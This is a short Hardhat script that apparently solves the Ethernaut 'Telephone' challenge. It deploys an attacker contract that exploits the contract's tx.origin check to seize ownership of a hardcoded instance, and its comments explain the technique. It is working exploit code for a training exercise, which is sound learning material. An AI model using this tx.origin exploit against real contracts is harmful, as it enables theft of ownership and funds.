const { BigNumber } = require("ethers");
const { ethers } = require("hardhat");

const INSTANCE = '0x3B14868558E8248Ed4AAc9e5851E27AB73770003'
const abi = ["function owner() public view returns (address)"];

async function hack(contract, signer) {
    // The contract allows owner change as long as the origin of the sending tx is different from msg.sender.
    // This happens when the EOA initiating the tx is different from who calls the contract.
    // We can accomplish this by sending a tx to a contract that calls the Telephone contract.
    // This makes us the tx.origin and the contract we use the msg.sender.
    const TelephoneHacker = await ethers.getContractFactory("TelephoneHacker");
    const telephonehacker = await TelephoneHacker.deploy(contract.address);
    await telephonehacker.deployed();
    console.log("TelephoneHacker Deployed To:", telephonehacker.address);

    // We now call our contract's steal function so that it calls the Telephone contract.
    const tx = await telephonehacker.steal();
    await tx.wait();

    const owner = await contract.owner();
    console.log(`Ownership Stolen. New Owner: ${owner}`);
}

const signer = ethers.getSigner().then(signer => {
    const contract = new ethers.Contract(INSTANCE, abi, signer);
    console.log('Contract Setup Completed.')
    hack(contract, signer)
})